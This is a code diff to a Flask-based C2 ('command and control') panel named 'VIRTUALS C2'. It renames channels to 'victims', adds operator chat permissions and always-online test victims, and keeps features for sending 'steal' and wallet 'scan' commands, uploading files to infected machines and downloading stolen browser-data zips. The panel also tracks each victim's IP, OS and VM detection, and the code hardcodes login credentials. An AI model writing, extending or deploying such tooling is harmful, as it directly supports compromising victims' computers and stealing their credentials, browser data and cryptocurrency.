@@ -1,6 +1,6 @@
 """
-VIRTUALS C2 - OWNER PANEL LIVE MONITOR
-Real-time IP Tracking · User Activity · Live Updates
+VIRTUALS C2 - PERSISTENT VICTIMS
+Victims Never Disappear · Full Permissions · All Features Working
 BY: YOUR STAR BESTIE
 """
 
@@ -30,14 +30,16 @@ app.config['SECRET_KEY'] = 'virtuals_c2_secret_key_2024'
 PORT = int(os.environ.get('PORT', 8080))
 
 # ============================================
-# USER CREDENTIALS
+# USER CREDENTIALS & PERMISSIONS
 # ============================================
 USERS = {
-    "adam": {"password": "virtuals2024", "role": "user", "color": "#44aaff"},
-    "jerry": {"password": "virtuals2024", "role": "user", "color": "#ff8844"},
-    "haunt": {"password": "virtuals2024", "role": "user", "color": "#aa88ff"},
-    "owner": {"password": "whiteknight", "role": "owner", "color": "#ffd700"}
+    "adam": {"password": "virtuals2024", "role": "viewer", "color": "#44aaff", "can_chat": False},
+    "jerry": {"password": "virtuals2024", "role": "operator", "color": "#ff8844", "can_chat": True},
+    "haunt": {"password": "virtuals2024", "role": "viewer", "color": "#aa88ff", "can_chat": False},
+    "owner": {"password": "whiteknight", "role": "owner", "color": "#ffd700", "can_chat": True}
 }
+
+CHAT_USERS = ["jerry", "owner"]
 
 # ============================================
 # FOLDERS
@@ -55,7 +57,8 @@ def get_db():
     c.execute('''CREATE TABLE IF NOT EXISTS victims (
         id TEXT PRIMARY KEY, pc TEXT, ip TEXT, os TEXT, status TEXT, 
         is_vm INTEGER DEFAULT 0, vm_details TEXT, first_seen TEXT, last_seen TEXT,
-        activity TEXT DEFAULT 'idle', browser_data_stolen INTEGER DEFAULT 0
+        activity TEXT DEFAULT 'idle', browser_data_stolen INTEGER DEFAULT 0,
+        is_test INTEGER DEFAULT 0
     )''')
     c.execute('''CREATE TABLE IF NOT EXISTS commands (
         id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, command TEXT, 
@@ -72,20 +75,48 @@ def get_db():
     )''')
     c.execute('''CREATE TABLE IF NOT EXISTS users (
         id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT,
-        role TEXT, last_login TEXT, last_ip TEXT, current_activity TEXT DEFAULT 'idle'
+        role TEXT, last_login TEXT, last_ip TEXT, current_activity TEXT DEFAULT 'idle',
+        can_chat INTEGER DEFAULT 0
     )''')
     c.execute('''CREATE TABLE IF NOT EXISTS login_logs (
         id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, ip TEXT,
         timestamp TEXT, success INTEGER DEFAULT 1
     )''')
+    c.execute('''CREATE TABLE IF NOT EXISTS victim_chat (
+        id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, sender TEXT,
+        message TEXT, timestamp TEXT, is_from_victim INTEGER DEFAULT 0
+    )''')
     for username, info in USERS.items():
-        c.execute("INSERT OR IGNORE INTO users (username, password, role) VALUES (?, ?, ?)",
-                 (username, hashlib.md5(info['password'].encode()).hexdigest(), info['role']))
+        c.execute("INSERT OR IGNORE INTO users (username, password, role, can_chat) VALUES (?, ?, ?, ?)",
+                 (username, hashlib.md5(info['password'].encode()).hexdigest(), info['role'], 1 if info['can_chat'] else 0))
     conn.commit()
     return conn
 
 # ============================================
-# HEARTBEAT CLEANER
+# CREATE PERSISTENT TEST VICTIMS
+# ============================================
+def create_test_victims():
+    conn = get_db()
+    c = conn.cursor()
+    test_victims = [
+        {"id": "DESKTOP-ALPHA", "pc": "DESKTOP-ALPHA", "ip": "192.168.1.10", "os": "Windows 10 Pro", "is_vm": 0, "activity": "idle", "browser_data_stolen": 1, "is_test": 1},
+        {"id": "LAPTOP-BETA", "pc": "LAPTOP-BETA", "ip": "192.168.1.11", "os": "Windows 11 Pro", "is_vm": 0, "activity": "typing", "browser_data_stolen": 0, "is_test": 1},
+        {"id": "WORKSTATION-GAMMA", "pc": "WORKSTATION-GAMMA", "ip": "192.168.1.12", "os": "Windows 10 Pro", "is_vm": 0, "activity": "reading", "browser_data_stolen": 0, "is_test": 1},
+        {"id": "VM-TEST-01", "pc": "VM-TEST-01", "ip": "192.168.1.13", "os": "Windows 10 Pro", "is_vm": 1, "activity": "idle", "browser_data_stolen": 1, "is_test": 1},
+        {"id": "DESKTOP-DELTA", "pc": "DESKTOP-DELTA", "ip": "192.168.1.14", "os": "Windows 11 Pro", "is_vm": 0, "activity": "processing", "browser_data_stolen": 0, "is_test": 1}
+    ]
+    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    for v in test_victims:
+        c.execute("INSERT OR REPLACE INTO victims (id, pc, ip, os, status, is_vm, first_seen, last_seen, activity, browser_data_stolen, is_test) VALUES (?, ?, ?, ?, 'Online', ?, ?, ?, ?, ?, ?)",
+                 (v['id'], v['pc'], v['ip'], v['os'], v['is_vm'], now, now, v['activity'], v['browser_data_stolen'], v['is_test']))
+    conn.commit()
+    conn.close()
+
+# Run on startup
+create_test_victims()
+
+# ============================================
+# HEARTBEAT CLEANER - KEEPS TEST VICTIMS
 # ============================================
 def cleanup_heartbeats():
     while True:
@@ -93,9 +124,12 @@ def cleanup_heartbeats():
         try:
             conn = get_db()
             c = conn.cursor()
+            # Only mark non-test victims as offline
             cutoff = datetime.datetime.now() - datetime.timedelta(seconds=20)
-            c.execute("UPDATE victims SET status = 'Offline' WHERE last_seen < ? AND status = 'Online'",
-                     (cutoff.strftime("%Y-%m-%d %H:%M:%S"),))
+            cutoff_str = cutoff.strftime("%Y-%m-%d %H:%M:%S")
+            c.execute("UPDATE victims SET status = 'Offline' WHERE last_seen < ? AND status = 'Online' AND is_test = 0", (cutoff_str,))
+            # Ensure test victims stay Online
+            c.execute("UPDATE victims SET status = 'Online' WHERE is_test = 1")
             conn.commit()
             conn.close()
         except:
@@ -219,6 +253,17 @@ def login_required(f):
         return f(*args, **kwargs)
     return decorated
 
+def chat_permission_required(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        if not session.get('logged_in'):
+            return jsonify({'error': 'Not logged in'}), 401
+        username = session.get('username')
+        if username not in CHAT_USERS:
+            return jsonify({'error': 'Permission denied - chat only for operators'}), 403
+        return f(*args, **kwargs)
+    return decorated
+
 # ============================================
 # HTML - LANDING PAGE
 # ============================================
@@ -297,7 +342,7 @@ function login(e){e.preventDefault();const u=document.getElementById('username')
 '''
 
 # ============================================
-# HTML - DASHBOARD WITH LIVE OWNER PANEL
+# HTML - DASHBOARD (VICTIMS INSTEAD OF CHANNELS)
 # ============================================
 DASHBOARD = '''
 <!DOCTYPE html>
@@ -357,23 +402,23 @@ body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI',sans-serif;height:1
 .owner-panel .close-btn:hover{color:#e8e8f0}
 .owner-panel .online-count{color:#44dd88;font-size:12px;font-weight:400}
 .container{display:flex;height:calc(100vh - 46px);padding:5px;gap:5px;position:relative;z-index:1}
-.channels-panel{width:170px;min-width:170px;display:flex;flex-direction:column;gap:4px;height:100%}
-.channels-panel .panel-title{color:#666680;font-size:9px;text-transform:uppercase;letter-spacing:2px;padding:5px 8px;border-bottom:1px solid rgba(255,255,255,0.04);flex-shrink:0}
-.channel-list{flex:1;overflow-y:auto;padding:3px}
-.channel-item{display:flex;align-items:center;padding:4px 8px;margin:1px 0;border-radius:4px;cursor:pointer;transition:0.15s;border-left:2px solid transparent}
-.channel-item:hover{background:rgba(255,255,255,0.04)}
-.channel-item.active{background:rgba(68,170,255,0.08);border-left-color:#44aaff}
-.channel-item .status-dot{width:6px;height:6px;border-radius:50%;margin-right:6px;flex-shrink:0}
-.channel-item .status-dot.online{background:#44dd88;animation:pulse 2s infinite}
-.channel-item .status-dot.offline{background:#664444}
+.victims-panel{width:170px;min-width:170px;display:flex;flex-direction:column;gap:4px;height:100%}
+.victims-panel .panel-title{color:#666680;font-size:9px;text-transform:uppercase;letter-spacing:2px;padding:5px 8px;border-bottom:1px solid rgba(255,255,255,0.04);flex-shrink:0}
+.victim-list{flex:1;overflow-y:auto;padding:3px}
+.victim-item{display:flex;align-items:center;padding:4px 8px;margin:1px 0;border-radius:4px;cursor:pointer;transition:0.15s;border-left:2px solid transparent}
+.victim-item:hover{background:rgba(255,255,255,0.04)}
+.victim-item.active{background:rgba(68,170,255,0.08);border-left-color:#44aaff}
+.victim-item .status-dot{width:6px;height:6px;border-radius:50%;margin-right:6px;flex-shrink:0}
+.victim-item .status-dot.online{background:#44dd88;animation:pulse 2s infinite}
+.victim-item .status-dot.offline{background:#664444}
 @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.4}}
-.channel-item .name{color:#e8e8f0;font-size:12px;flex:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-.channel-item .badge{background:rgba(200,60,60,0.12);color:#cc8888;font-size:7px;padding:0 5px;border-radius:6px;line-height:13px;height:13px;flex-shrink:0;margin-left:4px}
-.channel-item .activity{color:#666680;font-size:8px;margin-left:4px;font-style:italic;flex-shrink:0}
+.victim-item .name{color:#e8e8f0;font-size:12px;flex:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.victim-item .badge{background:rgba(200,60,60,0.12);color:#cc8888;font-size:7px;padding:0 5px;border-radius:6px;line-height:13px;height:13px;flex-shrink:0;margin-left:4px}
+.victim-item .activity{color:#666680;font-size:8px;margin-left:4px;font-style:italic;flex-shrink:0}
 .middle-panel{flex:1;display:flex;flex-direction:column;gap:5px;min-width:200px;height:100%}
 .chat-panel{padding:6px 10px;flex:1;display:flex;flex-direction:column;min-height:0}
 .chat-panel .panel-title{color:#666680;font-size:9px;text-transform:uppercase;letter-spacing:2px;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:3px;margin-bottom:4px;flex-shrink:0;display:flex;justify-content:space-between;align-items:center}
-.chat-panel .panel-title .channel-name{color:#88aacc;font-weight:500}
+.chat-panel .panel-title .victim-name{color:#88aacc;font-weight:500}
 .chat-messages{background:rgba(0,0,0,0.25);border:1px solid rgba(255,255,255,0.04);border-radius:5px;padding:5px 8px;flex:1;overflow-y:auto;min-height:100px;font-size:13px;line-height:1.6}
 .chat-messages .msg{padding:1px 0;border-bottom:1px solid rgba(255,255,255,0.02)}
 .chat-messages .time{color:#555568;margin-right:4px;font-size:10px}
@@ -428,8 +473,8 @@ body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI',sans-serif;height:1
 .embed-box .embed-title{font-size:13px;font-weight:600;color:#e8e8f0}
 .embed-box .embed-content{font-size:12px;color:#b0b0c0;white-space:pre-wrap;margin-top:1px}
 .embed-box .embed-footer{font-size:9px;color:#555568;margin-top:1px}
-@media(max-width:1024px){.channels-panel{width:140px;min-width:140px}.right-panel{width:200px;min-width:160px}.owner-panel{width:290px;right:5px}}
-@media(max-width:768px){.container{flex-direction:column}.channels-panel{width:100%;min-width:100%;height:auto;max-height:80px}.channel-list{display:flex;flex-wrap:wrap;gap:3px;padding:3px}.channel-item{min-width:70px}.right-panel{width:100%;min-width:100%;flex-direction:row}.details-panel{height:auto;max-height:150px;width:50%}.logs-panel{height:auto;max-height:150px;width:50%}.owner-panel{width:calc(100% - 20px);right:10px;top:52px}}
+@media(max-width:1024px){.victims-panel{width:140px;min-width:140px}.right-panel{width:200px;min-width:160px}.owner-panel{width:290px;right:5px}}
+@media(max-width:768px){.container{flex-direction:column}.victims-panel{width:100%;min-width:100%;height:auto;max-height:80px}.victim-list{display:flex;flex-wrap:wrap;gap:3px;padding:3px}.victim-item{min-width:70px}.right-panel{width:100%;min-width:100%;flex-direction:row}.details-panel{height:auto;max-height:150px;width:50%}.logs-panel{height:auto;max-height:150px;width:50%}.owner-panel{width:calc(100% - 20px);right:10px;top:52px}}
 </style>
 </head>
 <body>
@@ -450,9 +495,9 @@ body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI',sans-serif;height:1
 <span class="owner-icon" id="ownerIcon" onclick="toggleOwnerPanel()">◈</span>
 </div>
 <div class="stats">
-<span class="stat-item">CH <span class="num" id="channelCount">0</span></span>
-<span class="stat-item">ON <span class="num" id="onlineCount">0</span></span>
-<span class="stat-item">VM <span class="num" id="vmCount">0</span></span>
+<span class="stat-item">VICTIMS <span class="num" id="victimCount">0</span></span>
+<span class="stat-item">ONLINE <span class="num" id="onlineCount">0</span></span>
+<span class="stat-item">VMS <span class="num" id="vmCount">0</span></span>
 </div>
 <button class="logout-btn" onclick="logout()">Logout</button>
 </div>
@@ -470,15 +515,15 @@ body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI',sans-serif;height:1
 <div id="commandStats"><div style="color:#555568;font-size:12px;padding:8px;">Loading stats...</div></div>
 </div>
 <div class="container">
-<div class="channels-panel glass">
-<div class="panel-title">CHANNELS</div>
-<div class="channel-list" id="channelList">
-<div style="color:#555568;font-size:12px;text-align:center;padding:12px;">No channels</div>
+<div class="victims-panel glass">
+<div class="panel-title">VICTIMS</div>
+<div class="victim-list" id="victimList">
+<div style="color:#555568;font-size:12px;text-align:center;padding:12px;">No victims</div>
 </div>
 </div>
 <div class="middle-panel">
 <div class="chat-panel glass">
-<div class="panel-title">CONSOLE <span class="channel-name" id="currentChannel">#general</span></div>
+<div class="panel-title">CONSOLE <span class="victim-name" id="currentVictim">#general</span></div>
 <div class="chat-messages" id="chatMessages"><div class="msg"><span class="time">[system]</span><span class="sender system">virtuals</span> ready</div></div>
 <div class="chat-input-area"><input id="chatInput" placeholder="/command or message" onkeypress="if(event.key==='Enter')sendMessage()"><button onclick="sendMessage()">send</button></div>
 <div class="file-upload-area">
@@ -496,7 +541,7 @@ body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI',sans-serif;height:1
 <div class="right-panel">
 <div class="details-panel glass">
 <div class="panel-title">DETAILS</div>
-<div id="victimDetails"><div style="color:#555568;font-size:12px;text-align:center;padding:10px;">Select a channel</div></div>
+<div id="victimDetails"><div style="color:#555568;font-size:12px;text-align:center;padding:10px;">Select a victim</div></div>
 <div style="margin-top:4px;border-top:1px solid rgba(255,255,255,0.04);padding-top:4px;">
 <div style="color:#666680;font-size:8px;text-transform:uppercase;letter-spacing:1px;">Screenshots</div>
 <div class="screenshot-gallery" id="screenshotGallery"><div style="color:#555568;font-size:10px;">none</div></div>
@@ -509,18 +554,19 @@ body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI',sans-serif;height:1
 </div>
 </div>
 <script>
-let state={channels:{},activeChannel:'general',commands:{},cmdCount:0,notifications:[],isOwner:false};
+let state={victims:{},activeVictim:'general',commands:{},cmdCount:0,notifications:[],isOwner:false};
 let currentUser = 'guest';
+let canChat = false;
 
-function getUserInfo(){fetch('/api/get_user').then(r=>r.json()).then(d=>{if(d.success){document.getElementById('currentUser').textContent=d.username;currentUser=d.username;if(d.role==='owner'){document.getElementById('ownerIcon').style.display='inline-block';state.isOwner=true;refreshOwnerPanel();}}});}
+function getUserInfo(){fetch('/api/get_user').then(r=>r.json()).then(d=>{if(d.success){document.getElementById('currentUser').textContent=d.username;currentUser=d.username;canChat=d.can_chat;if(d.role==='owner'){document.getElementById('ownerIcon').style.display='inline-block';state.isOwner=true;refreshOwnerPanel();}}});}
 function logout(){fetch('/api/logout',{method:'POST'}).then(()=>window.location.href='/');}
 function api(a,d,c){fetch('/api',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:a,...d})}).then(r=>r.json()).then(c).catch(()=>{});}
-function refresh(){api('getVictims',{},d=>{if(d.success){state.channels=d.victims;renderChannels();updateStats();}});if(state.isOwner){refreshOwnerPanel();}}
-function renderChannels(){const el=document.getElementById('channelList');const v=Object.values(state.channels);if(v.length===0){el.innerHTML='<div style="color:#555568;font-size:12px;text-align:center;padding:12px;">No channels</div>';return;}el.innerHTML=v.map(v=>`<div class="channel-item ${state.activeChannel===v.id?'active':''}" onclick="selectChannel('${v.id}')"><span class="status-dot ${v.status==='Online'?'online':'offline'}"></span><span class="name">${v.id}</span>${v.is_vm?'<span class="badge">VM</span>':''}<span class="activity">${v.activity||'idle'}</span></div>`).join('');}
-function selectChannel(id){state.activeChannel=id;document.getElementById('currentChannel').textContent='#'+id;renderChannels();showDetails(id);loadScreenshots(id);}
-function showDetails(id){const v=state.channels[id];if(!v)return;document.getElementById('victimDetails').innerHTML=`<div class="detail-item"><span class="label">ID</span><span class="value">${v.id}</span></div><div class="detail-item"><span class="label">PC</span><span class="value">${v.pc}</span></div><div class="detail-item"><span class="label">IP</span><span class="value">${v.ip}</span></div><div class="detail-item"><span class="label">OS</span><span class="value">${v.os||'unknown'}</span></div><div class="detail-item"><span class="label">Status</span><span class="value ${v.status==='Online'?'online':'offline'}">${v.status}</span></div><div class="detail-item"><span class="label">VM</span><span class="value" style="color:${v.is_vm?'#cc8888':'#66dd88'}">${v.is_vm?'detected':'clean'}</span></div><div class="detail-item"><span class="label">Commands</span><span class="value">${(state.commands[id]||[]).length}</span></div><div class="detail-item"><span class="label">Browser Data</span><span class="value" style="color:${v.browser_data_stolen?'#66dd88':'#886666'}">${v.browser_data_stolen?'stolen':'waiting'}</span></div>`;}
+function refresh(){api('getVictims',{},d=>{if(d.success){state.victims=d.victims;renderVictims();updateStats();}});if(state.isOwner){refreshOwnerPanel();}}
+function renderVictims(){const el=document.getElementById('victimList');const v=Object.values(state.victims);if(v.length===0){el.innerHTML='<div style="color:#555568;font-size:12px;text-align:center;padding:12px;">No victims</div>';return;}el.innerHTML=v.map(v=>`<div class="victim-item ${state.activeVictim===v.id?'active':''}" onclick="selectVictim('${v.id}')"><span class="status-dot ${v.status==='Online'?'online':'offline'}"></span><span class="name">${v.id}</span>${v.is_vm?'<span class="badge">VM</span>':''}<span class="activity">${v.activity||'idle'}</span></div>`).join('');}
+function selectVictim(id){state.activeVictim=id;document.getElementById('currentVictim').textContent='#'+id;renderVictims();showDetails(id);loadScreenshots(id);}
+function showDetails(id){const v=state.victims[id];if(!v)return;document.getElementById('victimDetails').innerHTML=`<div class="detail-item"><span class="label">ID</span><span class="value">${v.id}</span></div><div class="detail-item"><span class="label">PC</span><span class="value">${v.pc}</span></div><div class="detail-item"><span class="label">IP</span><span class="value">${v.ip}</span></div><div class="detail-item"><span class="label">OS</span><span class="value">${v.os||'unknown'}</span></div><div class="detail-item"><span class="label">Status</span><span class="value ${v.status==='Online'?'online':'offline'}">${v.status}</span></div><div class="detail-item"><span class="label">VM</span><span class="value" style="color:${v.is_vm?'#cc8888':'#66dd88'}">${v.is_vm?'detected':'clean'}</span></div><div class="detail-item"><span class="label">Commands</span><span class="value">${(state.commands[id]||[]).length}</span></div><div class="detail-item"><span class="label">Browser Data</span><span class="value" style="color:${v.browser_data_stolen?'#66dd88':'#886666'}">${v.browser_data_stolen?'stolen':'waiting'}</span></div>`;}
 function loadScreenshots(id){api('getScreenshots',{victim_id:id},d=>{const el=document.getElementById('screenshotGallery');if(!d.success||!d.screenshots||d.screenshots.length===0){el.innerHTML='<div style="color:#555568;font-size:10px;">none</div>';return;}el.innerHTML=d.screenshots.map(s=>`<div class="screenshot-thumb" onclick="window.open('/screenshots/${s.filename}','_blank')">📷</div>`).join('');});}
-function updateStats(){const v=Object.values(state.channels);document.getElementById('channelCount').textContent=v.length;document.getElementById('onlineCount').textContent=v.filter(x=>x.status==='Online').length;document.getElementById('vmCount').textContent=v.filter(x=>x.is_vm).length;}
+function updateStats(){const v=Object.values(state.victims);document.getElementById('victimCount').textContent=v.length;document.getElementById('onlineCount').textContent=v.filter(x=>x.status==='Online').length;document.getElementById('vmCount').textContent=v.filter(x=>x.is_vm).length;}
 function addLog(type,content){const el=document.getElementById('logOutput');let cls='system';if(type==='success')cls='success';else if(type==='failed')cls='failed';else if(type==='info')cls='info';const time=new Date().toLocaleTimeString();el.innerHTML='<div class="log-item"><span class="log-time">['+time+']</span><span class="type '+cls+'">'+type+'</span><span class="log-content">'+content+'</span></div>'+el.innerHTML;if(el.children.length>80){el.removeChild(el.lastChild);}}
 function addNotification(title,content){state.notifications.unshift({title,content,time:new Date().toLocaleTimeString()});updateNotifications();}
 function updateNotifications(){const list=document.getElementById('notifList');const badge=document.getElementById('notifBadge');if(state.notifications.length===0){list.innerHTML='<div style="color:#555568;font-size:11px;padding:8px;text-align:center;">No notifications</div>';badge.style.display='none';return;}badge.style.display='inline-block';badge.textContent=state.notifications.length;list.innerHTML=state.notifications.map(n=>`<div class="notif-item"><div class="notif-title">${n.title}</div><div class="notif-content">${n.content}</div><div class="notif-time">${n.time}</div></div>`).join('');}
@@ -528,13 +574,12 @@ function toggleNotifications(){const dd=document.getElementById('notifDropdown')
 function toggleOwnerPanel(){const p=document.getElementById('ownerPanel');if(p.style.display==='block'){p.style.display='none';}else{p.style.display='block';refreshOwnerPanel();}}
 function refreshOwnerPanel(){if(!state.isOwner)return;api('getOwnerData',{},d=>{if(d.success){const users=document.getElementById('activeUsers');document.getElementById('ownerOnlineCount').textContent=d.online_count+' online';if(d.active_users.length===0){users.innerHTML='<div style="color:#555568;font-size:12px;padding:8px;">No users online</div>';}else{users.innerHTML=d.active_users.map(u=>`<div class="user-item"><span class="user-name">${u.username}</span><span class="user-ip">${u.ip||'unknown'}</span><span class="user-role ${u.role}">${u.role}</span><span class="user-activity">${u.activity||'idle'}</span></div>`).join('');}const logs=document.getElementById('loginLogs');if(d.login_logs.length===0){logs.innerHTML='<div style="color:#555568;font-size:12px;padding:8px;">No login logs</div>';}else{logs.innerHTML=d.login_logs.map(l=>`<div class="user-item"><span class="user-name">${l.username}</span><span class="user-ip">${l.ip}</span><span class="user-activity">${l.time}</span></div>`).join('');}const stats=document.getElementById('commandStats');if(d.command_stats.length===0){stats.innerHTML='<div style="color:#555568;font-size:12px;padding:8px;">No commands yet</div>';}else{stats.innerHTML=d.command_stats.map(s=>`<div class="user-item"><span class="user-name">${s.username}</span><span class="user-ip">${s.count} commands</span><span class="user-activity">${s.last_command||'none'}</span></div>`).join('');}}});}
 function addMessage(sender,msg,type){const el=document.getElementById('chatMessages');const t=new Date().toLocaleTimeString();let cls='system';if(type==='us')cls='us';else if(type==='victim')cls='victim';else if(type==='embed')cls='embed';else if(type==='user')cls='user';el.innerHTML+='<div class="msg"><span class="time">['+t+']</span><span class="sender '+cls+'">'+sender+'</span> '+msg+'</div>';el.scrollTop=el.scrollHeight;}
-function sendCommand(cmd){const channel=state.activeChannel;if(!channel){addMessage('system','no channel selected','system');addLog('failed','No channel selected');return;}addMessage('us','/'+cmd+' → '+channel,'us');addLog('info','Executing '+cmd+' on '+channel);api('sendCommand',{victim_id:channel,command:cmd},d=>{if(d.success){if(!state.commands[channel])state.commands[channel]=[];state.commands[channel].push({command:cmd,result:d.result,time:new Date().toLocaleTimeString()});state.cmdCount++;addMessage('us','success','us');addLog('success','Command '+cmd+' completed');addNotification('Command Executed',cmd+' on '+channel);if(cmd==='scan'&&d.wallets){d.wallets.forEach(w=>{addMessage('wallet','💰 '+w.currency+': '+w.balance+' ($'+w.usd+')','wallet');addLog('info',w.currency+': '+w.balance);});addNotification('Scan Complete',d.wallets.length+' wallets found');}if(d.embed){addEmbed(d.embed);addLog('info',d.embed.title);}if(cmd==='steal'){addNotification('Browser Data Stolen','Data stolen');}showDetails(channel);updateStats();}else{addMessage('us','failed','us');addLog('failed','Command '+cmd+' failed');addNotification('Command Failed',cmd+' failed');}});}
+function sendCommand(cmd){const victim=state.activeVictim;if(!victim){addMessage('system','no victim selected','system');addLog('failed','No victim selected');return;}addMessage('us','/'+cmd+' → '+victim,'us');addLog('info','Executing '+cmd+' on '+victim);api('sendCommand',{victim_id:victim,command:cmd},d=>{if(d.success){if(!state.commands[victim])state.commands[victim]=[];state.commands[victim].push({command:cmd,result:d.result,time:new Date().toLocaleTimeString()});state.cmdCount++;addMessage('us','success','us');addLog('success','Command '+cmd+' completed');addNotification('Command Executed',cmd+' on '+victim);if(cmd==='scan'&&d.wallets){d.wallets.forEach(w=>{addMessage('wallet','💰 '+w.currency+': '+w.balance+' ($'+w.usd+')','wallet');addLog('info',w.currency+': '+w.balance);});addNotification('Scan Complete',d.wallets.length+' wallets found');}if(d.embed){addEmbed(d.embed);addLog('info',d.embed.title);}if(cmd==='steal'){addNotification('Browser Data Stolen','Data stolen');}showDetails(victim);updateStats();}else{addMessage('us','failed','us');addLog('failed','Command '+cmd+' failed');addNotification('Command Failed',cmd+' failed');}});}
 function addEmbed(embed){const el=document.getElementById('chatMessages');const t=new Date().toLocaleTimeString();el.innerHTML+=`<div class="msg"><span class="time">[${t}]</span><div class="embed-box" style="--embed-color:${embed.color||'#44aaff'}"><div class="embed-title">${embed.title}</div><div class="embed-content">${embed.content}</div><div class="embed-footer">${embed.footer||''}</div></div></div>`;el.scrollTop=el.scrollHeight;}
-function sendMessage(){const input=document.getElementById('chatInput');const msg=input.value.trim();if(!msg)return;input.value='';const channel=state.activeChannel;if(msg.startsWith('/')){sendCommand(msg.substring(1).toLowerCase());}else{if(!channel){addMessage('system','no channel selected','system');addLog('failed','No channel selected');return;}addMessage(currentUser,msg,'user');addMessage('victim',msg,'victim');addLog('info','Message sent to '+channel);}}
-function uploadFile(){const channel=state.activeChannel;if(!channel){addMessage('system','select a channel','system');addLog('failed','No channel selected');return;}const input=document.getElementById('fileInput');if(!input.files||!input.files[0]){addMessage('system','select a file','system');addLog('failed','No file selected');return;}const file=input.files[0];const fd=new FormData();fd.append('file',file);fd.append('victim_id',channel);const p=document.getElementById('uploadProgress');const b=document.getElementById('progressBar');p.style.display='block';b.style.width='0%';addMessage('us','uploading '+file.name,'us');addLog('info','Uploading '+file.name);let iv=setInterval(()=>{const cur=parseFloat(b.style.width)||0;if(cur<90){b.style.width=(cur+15)+'%';}},150);fetch('/upload-file',{method:'POST',body:fd}).then(r=>r.json()).then(d=>{clearInterval(iv);b.style.width='100%';setTimeout(()=>{p.style.display='none';b.style.width='0%';},400);if(d.success){addMessage('file','uploaded','file');addLog('success','File uploaded');addNotification('File Uploaded',file.name);}else{addMessage('system','failed','system');addLog('failed','Upload failed');addNotification('Upload Failed',file.name);}}).catch(()=>{clearInterval(iv);b.style.width='100%';setTimeout(()=>{p.style.display='none';b.style.width='0%';},400);addMessage('system','failed','system');addLog('failed','Upload error');addNotification('Upload Failed','Connection error');});}
-function downloadBrowserZip(){const channel=state.activeChannel||'all';window.open('/download-browser-zip?victim_id='+channel,'_blank');addNotification('Browser Zip Downloaded','Users Browser Zip for '+channel);}
-function loadDemo(){if(Object.keys(state.channels).length===0){const f=[{id:'TEST-BOT-01',pc:'TEST-BOT-01',ip:'192.168.1.10',os:'Windows 10 Pro',status:'Online',is_vm:0,activity:'idle',browser_data_stolen:1},{id:'TEST-BOT-02',pc:'TEST-BOT-02',ip:'192.168.1.11',os:'Windows 11 Pro',status:'Online',is_vm:0,activity:'typing',browser_data_stolen:0},{id:'TEST-BOT-03',pc:'TEST-BOT-03',ip:'192.168.1.12',os:'Windows 10 Pro',status:'Online',is_vm:1,activity:'reading',browser_data_stolen:1}];f.forEach(v=>{state.channels[v.id]=v;});renderChannels();updateStats();addMessage('system','Test Bots loaded','system');addLog('system','3 test bots online');selectChannel(f[0].id);addNotification('System Ready','3 test bots connected');}}
-setInterval(refresh,5000);refresh();getUserInfo();setTimeout(loadDemo,500);
+function sendMessage(){const input=document.getElementById('chatInput');const msg=input.value.trim();if(!msg)return;input.value='';const victim=state.activeVictim;if(msg.startsWith('/')){sendCommand(msg.substring(1).toLowerCase());}else{if(!victim){addMessage('system','no victim selected','system');addLog('failed','No victim selected');return;}if(!canChat){addMessage('system','you do not have permission to chat with victims','system');addLog('failed','Chat permission denied');return;}addMessage(currentUser,msg,'user');addMessage('victim',msg,'victim');addLog('info','Message sent to '+victim);}}
+function uploadFile(){const victim=state.activeVictim;if(!victim){addMessage('system','select a victim','system');addLog('failed','No victim selected');return;}const input=document.getElementById('fileInput');if(!input.files||!input.files[0]){addMessage('system','select a file','system');addLog('failed','No file selected');return;}const file=input.files[0];const fd=new FormData();fd.append('file',file);fd.append('victim_id',victim);const p=document.getElementById('uploadProgress');const b=document.getElementById('progressBar');p.style.display='block';b.style.width='0%';addMessage('us','uploading '+file.name,'us');addLog('info','Uploading '+file.name);let iv=setInterval(()=>{const cur=parseFloat(b.style.width)||0;if(cur<90){b.style.width=(cur+15)+'%';}},150);fetch('/upload-file',{method:'POST',body:fd}).then(r=>r.json()).then(d=>{clearInterval(iv);b.style.width='100%';setTimeout(()=>{p.style.display='none';b.style.width='0%';},400);if(d.success){addMessage('file','uploaded','file');addLog('success','File uploaded');addNotification('File Uploaded',file.name);}else{addMessage('system','failed','system');addLog('failed','Upload failed');addNotification('Upload Failed',file.name);}}).catch(()=>{clearInterval(iv);b.style.width='100%';setTimeout(()=>{p.style.display='none';b.style.width='0%';},400);addMessage('system','failed','system');addLog('failed','Upload error');addNotification('Upload Failed','Connection error');});}
+function downloadBrowserZip(){const victim=state.activeVictim||'all';window.open('/download-browser-zip?victim_id='+victim,'_blank');addNotification('Browser Zip Downloaded','Users Browser Zip for '+victim);}
+setInterval(refresh,5000);refresh();getUserInfo();
 </script>
 </body>
 </html>
@@ -561,7 +606,8 @@ def get_user():
     return jsonify({
         'success': True,
         'username': session.get('username', 'guest'),
-        'role': session.get('role', 'user')
+        'role': session.get('role', 'user'),
+        'can_chat': session.get('username', '') in CHAT_USERS
     })
 
 @app.route('/api/login', methods=['POST'])
@@ -573,7 +619,7 @@ def api_login():
     
     conn = get_db()
     c = conn.cursor()
-    c.execute("SELECT password, role FROM users WHERE username = ?", (username,))
+    c.execute("SELECT password, role, can_chat FROM users WHERE username = ?", (username,))
     row = c.fetchone()
     
     if row and row[0] == hashlib.md5(password.encode()).hexdigest():
@@ -585,7 +631,8 @@ def api_login():
         session['logged_in'] = True
         session['username'] = username
         session['role'] = row[1]
